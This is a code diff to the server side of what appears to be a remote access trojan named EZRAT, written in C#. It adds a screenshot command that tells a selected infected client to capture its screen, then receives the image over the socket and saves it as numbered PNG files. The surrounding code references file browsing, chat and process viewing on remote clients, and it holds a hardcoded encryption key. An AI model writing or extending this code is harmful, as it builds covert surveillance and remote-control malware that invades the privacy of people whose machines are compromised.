@@ -29,6 +29,7 @@ namespace EZRATServer
         private int _port = 0;
         private static Socket _serverSocket;
         private static string EncryptKey = "POULPE212123542345235";
+        private uint screenShotNumber = 0;
         FileBrowser fl;
         Chat cht;
         ProcessViewer pc;
@@ -312,6 +313,9 @@ namespace EZRATServer
                     pc = new ProcessViewer(this, this.lstClients.SelectedIndices[0]);
                     SendCommand("procview;", this.lstClients.SelectedIndices[0]);
                     pc.Show();
+                    break;
+                case "ScreenShot":
+                    SendCommand("scrnshot;", this.lstClients.SelectedIndices[0]);
                     break;
                 default:
                     break;
@@ -668,7 +672,17 @@ namespace EZRATServer
                         text = text.Substring(9);
                         string[] res = text.Split(';');
                         pc.UpdateData(res);
-
+                    }
+                    else if (text.StartsWith("scrnshot;"))
+                    {
+                        text = text.Substring(9);
+                        byte[] img = Encoding.Default.GetBytes(text);
+                        Bitmap bp;
+                        using (MemoryStream ms = new MemoryStream(img))
+                        {
+                            bp = new Bitmap(ms);
+                        }
+                        SaveScreenShot(bp);
 
                     }
                 }
@@ -680,6 +694,16 @@ namespace EZRATServer
             if (!dclient) current.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, current); //If client is not disconnecting, restart the reading
         }
 
+
+        private void SaveScreenShot(Image img)
+        {
+            string dir = Environment.CurrentDirectory + @"\ScreenShot\";
+            if (!Directory.Exists(dir))
+            {
+                Directory.CreateDirectory(dir);
+            }
+            img.Save(dir + $@"ScreenShot_{screenShotNumber += 1}.png");
+        }
 
 
         public void SendFile(string path, string pathUploaded, int id)
